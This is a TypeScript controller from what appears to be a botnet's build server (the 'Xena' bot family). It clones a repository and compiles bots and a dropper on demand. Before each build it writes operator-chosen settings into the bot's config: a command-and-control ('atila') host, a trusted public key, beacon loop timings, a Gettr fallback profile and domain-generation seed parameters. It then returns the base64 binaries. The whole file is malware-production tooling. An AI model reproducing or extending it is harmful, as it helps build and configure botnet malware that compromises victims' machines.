import * as Validator from 'App/Validators'
import * as Repo from 'App/Repos'
import * as Domain from 'App/Domains'
import * as Service from 'App/Services'
import * as Helper from 'App/Helpers'

import Env from '@ioc:Adonis/Core/Env'
import fs from 'fs'

import { HttpContextContract } from '@ioc:Adonis/Core/HttpContext'
import { v4 as uuidv4 } from 'uuid'

export default class BuildsController {
  public get = async ({ request, response }: HttpContextContract) => {
    const { id } = await request.validate(Validator.Build.Get)

    const maybeBuild = await Repo.Build.get({ id })
    if (!maybeBuild)
      return response.noContent()

    const build = Domain.Build.fromJSON(maybeBuild)
    
    return response.ok(build.toBinary)
  }

  public getMultiple = async ({ request, response }: HttpContextContract) => {
    const { page } = await request.validate(Validator.Build.GetMultiple)

    const maybeBuilds = await Repo.Build.getMultiple({ page })
    if (!maybeBuilds.length)
      return response.noContent()

    const builds = maybeBuilds.map(build => Domain.Build.fromJSON(build).toJSON)

    return response.ok(builds)
  }

  public insert = async ({ request, response }: HttpContextContract) => {
    const { buildProfileId } = await request.validate(Validator.Build.Insert)

    const maybeBuildProfile = await Repo.BuildProfile.get({ id: buildProfileId })
    if (!maybeBuildProfile)
      return response.notFound({ success: false, message: 'Build profile not found.' })

    const buildProfile = Domain.BuildProfile.fromJSON(maybeBuildProfile)

    const buildId = uuidv4()

    // Clone the repo.
    const repositoryStatus = (() => {
      try {
        return Service.Git.clone(buildProfile.gitUrl, buildId)
      } catch (e) {
        console.warn(e)
        return 'ERROR'
      }
    })()

    if (repositoryStatus != 'CLONED')
      return response.internalServerError({ success: true, message: 'Failed to clone the repository.' })

    switch (buildProfile.config.template) {
      case 'XENA_BOT_RA':
        // const ra = await this.buildRa(buildId, buildProfileId)
        // return ra == 'ERROR'
        //   ? response.internalServerError({ success: false, message: 'Failed to build.' })
        //   : response.ok(ra)
        return response.internalServerError({ success: false, message: 'Not yet implemented.' })

      case 'XENA_BOT_APEP':
        const apep = await this.buildApep(buildId, buildProfileId, buildProfile.config.atilaHost!, buildProfile.config.trustedPublicKey!,
          buildProfile.config.maxLoopWait!, buildProfile.config.minLoopWait!, buildProfile.config.gettrProfileName!,
          buildProfile.config.dgaSeed!, buildProfile.config.dgaAfterDays!)
        return apep
          ? response.ok(apep)
          : response.internalServerError({ success: false, message: 'Failed to build.' })

      case 'XENA_BOT_MONOLITIC':
        const monolitic = await this.buildMonolitic(buildId, buildProfileId)
        return monolitic
          ? response.ok(monolitic)
          : response.internalServerError({ success: false, message: 'Failed to build.' })

      case 'XENA_BOT_ANACONDA':
        if (!buildProfile.config.atilaHost || !buildProfile.config.trustedPublicKey)
          throw 'BAD_ANACONDA_CONFIG'
        const anaconda = await this.buildAnaconda(buildId, buildProfileId, buildProfile.config.atilaHost, buildProfile.config.trustedPublicKey)
        return anaconda
          ? response.ok(anaconda)
          : response.internalServerError({ success: false, message: 'Failed to build.' })

      case 'XENA_BOT_VARVARA':
        const varvara = await this.buildVarvara(buildId, buildProfileId)
        return varvara
          ? response.ok(varvara)
          : response.internalServerError({ success: false, message: 'Failed to build.' })

      default:
        return response.unprocessableEntity({ success: false, message: 'Unrecognized build template.' })
    }
  }

  public update = async ({}: HttpContextContract) => {
    // todo
  }

  public delete = async ({}: HttpContextContract) => {
    // todo
  }

  private buildVarvara = async (buildId: string, buildProfileId: string) => {
    // Build the binary.
    const buildOutput = (() => {
      const buildCommand =
        `cd ${Service.Git.pathPrefix}${buildId}/droppers/xena-dropper-varvara && sh build.sh`
      try {
        return Helper.Shell.exe(buildCommand)
      } catch (e) {
        console.warn(e)
        return 'ERROR'
      }
    })()

    if (buildOutput == 'ERROR')
      throw Error('Unable to build.')

    const botLocation = `${Env.get('BUILD_DESTINATION')}${buildId}/droppers/xena-dropper-varvara/build/cpp/Main`

    // Base64 binary.
    const base64Binary = await Domain.Build.getBinary(botLocation)

    // Store the build.
    const build = await Repo.Build.insert( Domain.Build.fromJSON({
      id: buildId,
      buildProfileId, 
      data: base64Binary,
    })).then(build => Domain.Build.fromJSON(build))

    // Repo cleaning.
    try {
      Helper.Shell.exe(`rm -r ${Service.Git.pathPrefix}${buildId}`)
    } catch (e) {
      console.warn(e)
      return 'ERROR'
    }

    // Return the build binary.
    return build.toBinary
  }

  private buildAnaconda = async (buildId: string, buildProfileId: string, atilaHost: string, trustedPublicKey: string) => {
    fs.renameSync(
      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-anaconda/env.example.py`,
      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-anaconda/env.py`,
    )

    const envContent = fs.readFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-anaconda/env.py`)
      .toString()
      .replace('http://127.0.0.1:60666', atilaHost)
      .replace('-----BEGIN PUBLIC KEY-----\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n9\\n10\\n11\\n12\\n-----END PUBLIC KEY-----\\n', trustedPublicKey)
    
    console.log(envContent)

    fs.writeFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-anaconda/env.py`, envContent)
    
    // Build the binary.
    const buildOutput = (() => {
      const buildCommand =
        `cd ${Service.Git.pathPrefix}${buildId}/bots/xena-bot-anaconda && python3 compile.py`
      try {
        return Helper.Shell.exe(buildCommand)
      } catch (e) {
        console.warn(e)
        return 'ERROR'
      }
    })()

    if (buildOutput == 'ERROR')
      throw Error('Unable to build.')

    const botLocation = `${Env.get('BUILD_DESTINATION')}${buildId}/bots/xena-bot-anaconda/app`

    // Base64 binary.
    const base64Binary = await Domain.Build.getBinary(botLocation)

    // Store the build.
    const build = await Repo.Build.insert( Domain.Build.fromJSON({
      id: buildId,
      buildProfileId, 
      data: base64Binary,
    })).then(build => Domain.Build.fromJSON(build))

    // Repo cleaning.
    try {
      Helper.Shell.exe(`rm -r ${Service.Git.pathPrefix}${buildId}`)
    } catch (e) {
      console.warn(e)
      return 'ERROR'
    }

    // Return the build binary.
    return build.toBinary
  }

  private buildMonolitic = async (
    buildId: string,
    buildProfileId: string,
  ) => {
    fs.renameSync(
      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-monolitic/env.example.hpp`,
      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-monolitic/env.hpp`,
    )

    const envContent = fs.readFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-monolitic/env.hpp`)
      .toString()
      //.replace('#define TALK', '// #define TALK')
    
    fs.writeFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-monolitic/env.hpp`, envContent)

    // Build the binary.
    const buildOutput = (() => {
      const buildCommand =
        `cd ${Service.Git.pathPrefix}${buildId}/bots/xena-bot-monolitic && sh build.sh`
      try {
        return Helper.Shell.exe(buildCommand)
      } catch (e) {
        console.warn(e)
        return 'ERROR'
      }
    })()
    
    if (buildOutput == 'ERROR')
      throw Error('Unable to build.')
    
    const botLocation = `${Env.get('BUILD_DESTINATION')}${buildId}/bots/xena-bot-monolitic/build/main_static`

    // Base64 binary.
    const base64Binary = await Domain.Build.getBinary(botLocation)
        
    // Store the build.
    const build = Domain.Build.fromJSON({
      id: buildId,
      buildProfileId, 
      data: base64Binary,
    })

    // Repo cleaning.
    try {
      Helper.Shell.exe(`rm -r ${Service.Git.pathPrefix}${buildId}`)
    } catch (e) {
      console.warn(e)
      return 'ERROR'
    }

    // Return the build binary.
    return build.toBinary
  }

  private buildApep = async (
    buildId: string,
    buildProfileId: string,
    atilaHost: string,
    trustedPublicKey: string,
    maxLoopWait: string,
    minLoopWait: string,
    gettrProfileName: string,
    dgaSeed: string,
    dgaAfterDays: string,
  ) => {
    fs.renameSync(
      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep/config/env.example`,
      `${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep/config/env.go`,
    )

    const envContent = fs.readFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep/config/env.go`)
      .toString()
      .replace('http://127.0.0.1:60666', atilaHost)
      .replace('-----BEGIN PUBLIC KEY-----\\n1\\n2\\n3\\n4\\n5\\n6\\n7\\n8\\n9\\n10\\n11\\n12\\n-----END PUBLIC KEY-----\\n', trustedPublicKey)
      .replace('var MaxLoopWait int = 10', `var MaxLoopWait int = ${maxLoopWait}`)
      .replace('var MinLoopWait int = 5', `var MinLoopWait int = ${minLoopWait}`)
      .replace('var GettrProfileName string = ""', `var GettrProfileName string = "${gettrProfileName}"`)
      .replace('var DgaSeed = 123', `var DgaSeed = ${dgaSeed}`)
      .replace('var DgaAfterDays = 7', `var DgaAfterDays = ${dgaAfterDays}`)
    
    fs.writeFileSync(`${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep/config/env.go`, envContent)

    // Build the binary.
    const buildOutput = (() => {
      const buildCommand =
        `cd ${Service.Git.pathPrefix}${buildId}/bots/xena-bot-apep && go get && sh build.sh` // -o ${Env.get('BUILD_DESTINATION')}${buildId}_BUILD
      try {
        return Helper.Shell.exe(buildCommand)
      } catch (e) {
        console.warn(e)
        return 'ERROR'
      }
    })()
    
    if (buildOutput == 'ERROR')
      throw Error('Unable to build.')

    const botLocation = `${Env.get('BUILD_DESTINATION')}${buildId}/bots/xena-bot-apep/build/main_linux_64`

    // Base64 binary.
    const base64Binary = await Domain.Build.getBinary(botLocation)

    // Store the build.
    const build = Domain.Build.fromJSON({
      id: buildId,
      buildProfileId, 
      data: base64Binary,
    })

    // Repo cleaning.
    try {
      Helper.Shell.exe(`rm -r ${Service.Git.pathPrefix}${buildId}`)
    } catch (e) {
      console.warn(e)
      return 'ERROR'
    }

    // Return the build binary.
    return build.toBinary
  }
}
